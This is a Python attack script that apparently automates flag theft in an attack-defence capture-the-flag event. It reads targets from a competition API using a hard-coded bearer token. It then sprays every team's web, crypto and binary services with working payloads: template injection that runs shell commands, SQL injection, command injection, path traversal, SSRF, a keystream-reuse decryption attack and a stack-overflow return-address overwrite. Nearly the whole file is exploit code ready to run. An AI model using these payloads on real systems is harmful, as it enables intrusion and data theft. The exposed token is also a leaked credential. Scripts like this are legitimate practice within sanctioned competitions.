#!/usr/bin/env python3
# kaboom.py - polyglot blast + cache HIT only
import requests, re, socket, struct, hashlib, sys, base64, json, os
import concurrent.futures as cf
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

BASE_API = "https://jcc.jatimprov.go.id/api"
GAME_ID  = 5
TOKEN    = "ad_srC7r2tIqEB4LKTpjzpzKKndATZR0Bk05FYluXtFR8k"
HEADERS  = {"Authorization": f"Bearer {TOKEN}", "User-Agent": "Mozilla/5.0"}
TIMEOUT  = (1.5, 3.0)
WORKERS  = 60
SAVE     = "flags.txt"
CACHE    = "hits.json"

FLAG_RE = re.compile(r"(?:flag|FLAG|JCC|jcc|CTF|ctf)[A-Za-z0-9_\-]*\{[^}\n]{3,300}\}")
FLAG_BY = re.compile(rb"(?:flag|FLAG|JCC|jcc|CTF|ctf)[A-Za-z0-9_\-]*\{[^}\n]{3,300}\}")
CRYPTO_KEY = hashlib.sha256(b"simple-crypto-fixed-stream").digest()

# ====================================================================
# CACHE — cuma HIT yang kesimpen
# ====================================================================
def load_hits():
    if os.path.exists(CACHE):
        try:
            with open(CACHE) as f: return json.load(f)
        except: pass
    return {}

def save_hits(h):
    with open(CACHE, "w") as f: json.dump(h, f, indent=2)

def remember(hits, key, info):
    """Simpen cuma kalau belum ada, atau update kalau payload baru works."""
    hits[key] = info

# ====================================================================
# TARGETS
# ====================================================================
def get_targets(title):
    r = requests.get(f"{BASE_API}/Game/{GAME_ID}/Ad/Targets",
                     headers=HEADERS, timeout=10)
    r.raise_for_status()
    return [(t["teamName"], t["ip"], int(t["port"]))
            for ch in r.json()["challenges"] if ch["title"] == title
            for t in ch["teams"] if t.get("ip") and t.get("port")]

# ====================================================================
# PAYLOAD BANK
# ====================================================================
SSTI_JINJA  = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag*').read()}}"
SSTI_TWIG   = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag*')}}"
SSTI_FM     = "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /flag*')}"
SSTI_ERB    = "<%= `cat /flag*` %>"
SQLI_UNION  = "1'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/flags--/**/-"
SQLI_BYPASS = "admin'/**/OR/**/'1'='1'--/**/-"
CMDI_LINUX  = ";cat$IFS/flag*;"
LFI_TRAV    = "....//....//....//....//flag"
LFI_PHP     = "php://filter/convert.base64-encode/resource=/flag"
SSRF_INT    = "http://127.0.0.1:8080/flag"
XSS_PROBE   = "<svg/onload=alert(1)>"

FIELD_PAYLOADS = {
    "template": SSTI_JINJA, "tpl": SSTI_JINJA, "page": SSTI_JINJA,
    "content": SSTI_JINJA, "text": SSTI_JINJA, "body": SSTI_JINJA,
    "username": SQLI_BYPASS, "user": SQLI_BYPASS, "email": SQLI_BYPASS,
    "id": SQLI_UNION, "q": SQLI_UNION, "search": SQLI_UNION,
    "password": SQLI_BYPASS, "pass": SQLI_BYPASS,
    "cmd": CMDI_LINUX, "exec": CMDI_LINUX, "command": CMDI_LINUX,
    "ip": CMDI_LINUX, "host": CMDI_LINUX, "target": CMDI_LINUX,
    "ping": CMDI_LINUX,
    "file": LFI_TRAV, "path": LFI_TRAV, "load": LFI_TRAV,
    "view": LFI_TRAV, "read": LFI_TRAV, "download": LFI_TRAV,
    "include": LFI_TRAV,
    "url": SSRF_INT, "uri": SSRF_INT, "fetch": SSRF_INT,
    "src": SSRF_INT, "dest": SSRF_INT, "redirect": SSRF_INT,
    "name": XSS_PROBE, "comment": XSS_PROBE, "msg": XSS_PROBE,
    "message": XSS_PROBE,
}

def build_body():
    return dict(FIELD_PAYLOADS)

# ====================================================================
# WEB — cek cache dulu → kalau ada, langsung pake. Kalau gak, blast.
# ====================================================================
COMMON_ENDPOINTS = ["/", "/preview", "/submit", "/render", "/login", "/search"]

def fingerprint(base):
    try:
        r = requests.get(base, timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": "Mozilla/5.0"})
        body = r.text[:65536]
        actions = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.I)
        actions = [a if a.startswith("/") else "/" + a.lstrip("./")
                   for a in actions if a and a != "#"]
        return actions[0] if actions else "/"
    except Exception:
        return "/"

def hit_web(target, hits):
    team, ip, port = target
    key = f"{ip}:{port}"
    base = f"http://{ip}:{port}"

    # ---- Kalau ada cache HIT: langsung exploit pakai payload yang works ----
    if key in hits:
        cached = hits[key]
        ep      = cached["endpoint"]
        payload = cached["body"]
        url = urljoin(base + "/", ep.lstrip("/"))
        for method in ("post", "get"):
            try:
                if method == "post":
                    r = requests.post(url, data=payload, timeout=TIMEOUT, verify=False)
                else:
                    r = requests.get(url, params=payload, timeout=TIMEOUT, verify=False)
                m = FLAG_RE.search(r.text)
                if m:
                    return (team, f"WEB-cached:{ep}", m.group(0))
            except Exception:
                pass
        # cache stale — coba ulang full
        del hits[key]

    # ---- Belum ada di cache: fingerprint + polyglot blast ----
    body = build_body()
    ep = fingerprint(base)

    candidates = [ep] + [e for e in COMMON_ENDPOINTS if e != ep]

    for cep in candidates[:3]:
        url = urljoin(base + "/", cep.lstrip("/"))
        for method in ("post", "get"):
            try:
                if method == "post":
                    r = requests.post(url, data=body, timeout=TIMEOUT, verify=False)
                else:
                    r = requests.get(url, params=body, timeout=TIMEOUT, verify=False)
                m = FLAG_RE.search(r.text)
                if m:
                    # *** HIT — simpen ke cache ***
                    remember(hits, key, {
                        "endpoint": cep,
                        "method": method,
                        "body": body,
                        "flag_sample": m.group(0),
                    })
                    return (team, f"WEB:{method}:{cep}", m.group(0))
            except Exception:
                pass
    return None

# ====================================================================
# CRYPTO — cache varian yang works
# ====================================================================
def hit_crypto(target, hits):
    team, ip, port = target
    key = f"{ip}:{port}"
    base = f"http://{ip}:{port}"
    s = requests.Session(); s.verify = False

    # ---- Kalau cache: cuma coba varian yang works ----
    if key in hits:
        variant = hits[key].get("variant")
        try:
            if variant == "reuse":
                blob = bytes.fromhex(s.get(f"{base}/api/flag", timeout=2).json()["ciphertext"])
                known = b"A" * len(blob)
                ks = bytes.fromhex(s.post(f"{base}/api/encrypt",
                                          json={"message": known.decode('latin1')},
                                          timeout=2).json()["ciphertext"])
                flag = bytes(a ^ b ^ c for a, b, c in zip(blob, ks, known))
                m = FLAG_BY.search(flag)
                if m: return (team, "CRYPTO-reuse", m.group(0).decode())
            elif variant == "derivable":
                algo_name = hits[key].get("algo", "sha256")
                combo = hits[key].get("combo", "key_iv")
                algo = {"sha256": hashlib.sha256, "md5": hashlib.md5, "sha1": hashlib.sha1}[algo_name]
                blob = bytes.fromhex(s.get(f"{base}/api/flag", timeout=2).json()["ciphertext"])
                iv, bd = blob[:16], blob[16:]
                data = CRYPTO_KEY + iv if combo == "key_iv" else iv + CRYPTO_KEY
                dyn = algo(data).digest()
                flag = bytes(b ^ dyn[i % len(dyn)] for i, b in enumerate(bd))
                m = FLAG_BY.search(flag)
                if m: return (team, f"CRYPTO-{variant}", m.group(0).decode())
        except Exception:
            pass
        del hits[key]

    # ---- Belum cached: coba semua varian ----
    try:
        blob = bytes.fromhex(s.get(f"{base}/api/flag", timeout=2).json()["ciphertext"])
    except Exception:
        return None
    if not blob: return None

    known = b"A" * min(len(blob), 512)
    try:
        ks = bytes.fromhex(s.post(f"{base}/api/encrypt",
                                  json={"message": known.decode('latin1')},
                                  timeout=2).json()["ciphertext"])
    except Exception:
        return None

    # Varian A: reuse
    if len(ks) == len(blob):
        flag = bytes(a ^ b ^ c for a, b, c in zip(blob, ks, known))
        m = FLAG_BY.search(flag)
        if m:
            remember(hits, key, {"variant": "reuse"})
            return (team, "CRYPTO-reuse", m.group(0).decode())

    # Varian B: derivable KEY
    if len(ks) == len(known) + 16:
        iv, bd = blob[:16], blob[16:]
        for algo_name, algo in [("sha256", hashlib.sha256), ("md5", hashlib.md5),
                                ("sha1", hashlib.sha1)]:
            for combo_name, data in [("key_iv", CRYPTO_KEY + iv),
                                     ("iv_key", iv + CRYPTO_KEY)]:
                try:
                    dyn = algo(data).digest()
                    flag = bytes(b ^ dyn[i % len(dyn)] for i, b in enumerate(bd))
                    m = FLAG_BY.search(flag)
                    if m:
                        remember(hits, key, {"variant": "derivable",
                                             "algo": algo_name, "combo": combo_name})
                        return (team, f"CRYPTO-{algo_name}-{combo_name}", m.group(0).decode())
                except: pass
    return None

# ====================================================================
# PWN — cache offset yang works
# ====================================================================
def hit_pwn(target, hits):
    team, ip, port = target
    key = f"{ip}:{port}"

    # ---- Cached offset ----
    offsets = [72, 80, 64, 88]
    if key in hits:
        cached_off = hits[key].get("offset")
        offsets = [cached_off] + [o for o in offsets if o != cached_off]

    for off in offsets[:4]:
        try:
            s = socket.create_connection((ip, port), timeout=3)
            s.settimeout(2)
            buf = b""
            while b"name:" not in buf:
                ch = s.recv(4096)
                if not ch: break
                buf += ch
            s.sendall(b"A"*off + struct.pack("<Q", 0x4012a3) + struct.pack("<Q", 0x4011b6))
            data = b""
            try:
                while True:
                    ch = s.recv(4096)
                    if not ch: break
                    data += ch
            except socket.timeout: pass
            s.close()
            m = FLAG_BY.search(data)
            if m:
                remember(hits, key, {"offset": off})
                return (team, f"PWN-off{off}", m.group(0).decode())
        except Exception:
            continue
    return None

# ====================================================================
# RUNNER
# ====================================================================
MODES = {
    "web":    ("simple-web",    hit_web),
    "crypto": ("simple-crypto", hit_crypto),
    "pwn":    ("simple-pwn",    hit_pwn),
}

def run_one(mode, hits):
    title, fn = MODES[mode]
    targets = get_targets(title)
    cached = sum(1 for t in targets if f"{t[1]}:{t[2]}" in hits)
    print(f"[*] {mode}: {len(targets)} tim ({cached} cached)")

    found = []
    with cf.ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(fn, t, hits): t for t in targets}
        for fut in cf.as_completed(futs, timeout=120):
            try: res = fut.result(timeout=10)
            except: continue
            if res:
                found.append(res)
                print(f"  [+] {res[0]:40} {res[1]:22} {res[2]}", flush=True)
    return found

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
    hits = load_hits()

    if mode == "all":
        all_found = []
        with cf.ThreadPoolExecutor(max_workers=3) as ex:
            futs = [ex.submit(run_one, m, hits) for m in ("web", "crypto", "pwn")]
            for fut in cf.as_completed(futs):
                try: all_found.extend(fut.result())
                except: pass
    else:
        all_found = run_one(mode, hits)

    save_hits(hits)

    flags = [h[2] for h in all_found]
    with open(SAVE, "w") as fp:
        for f in sorted(set(flags)):
            fp.write(f + "\n")

    print(f"\n[*] {len(set(flags))} flag unik")
    print(f"[*] Cache HIT: {len(hits)} target")
    print(f"[*] Saved ke {SAVE}")

if __name__ == "__main__":
    main()
